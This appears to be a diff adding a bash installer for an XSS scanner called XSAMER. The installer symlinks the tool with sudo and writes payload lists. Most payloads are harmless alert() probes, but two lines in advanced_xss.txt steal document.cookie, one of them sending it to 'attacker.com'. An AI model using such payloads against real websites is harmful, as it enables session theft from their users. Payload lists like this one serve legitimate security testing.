@@ -1,0 +1,51 @@
+#!/bin/bash
+echo "🚀 Installing XSAMER XSS Scanner..."
+
+# Install Python dependencies
+pip3 install requests
+
+# Make the script executable
+chmod +x xsamer.py
+
+# Create symbolic link for easy access with xsamer command
+sudo ln -sf $(pwd)/xsamer.py /usr/local/bin/xsamer
+
+# Create necessary directories
+mkdir -p payloads
+
+# Create sample payload files
+cat > payloads/basic_xss.txt << 'EOF'
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+javascript:alert('XSS')
+<body onload=alert('XSS')>
+EOF
+echo "[+] Created basic_xss.txt"
+
+cat > payloads/advanced_xss.txt << 'EOF'
+<script>fetch('/steal?cookie='+document.cookie)</script>
+<img src=x onerror="fetch('http://attacker.com/?c='+btoa(document.cookie))">
+<iframe src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+EOF
+echo "[+] Created advanced_xss.txt"
+
+cat > payloads/dom_xss.txt << 'EOF'
+#<img src=x onerror=alert(1)>
+javascript:alert('DOM-XSS')
+#" onmouseover="alert(1)
+EOF
+
+
+echo "[+] Created urls.txt"
+
+echo ""
+echo "✅ XSAMER Installation Completed!"
+echo ""
+echo "Usage examples:"
+echo "  xsamer                          # Show banner and quick help"
+echo "  xsamer -u https://example.com   # Scan single URL with all payloads"
+echo "  xsamer -u https://example.com -xss -v  # XSS Combo with verbose"
+echo "  xsamer -l urls.txt              # Scan URLs file"
+echo "  xsamer --show                   # Show all payloads"
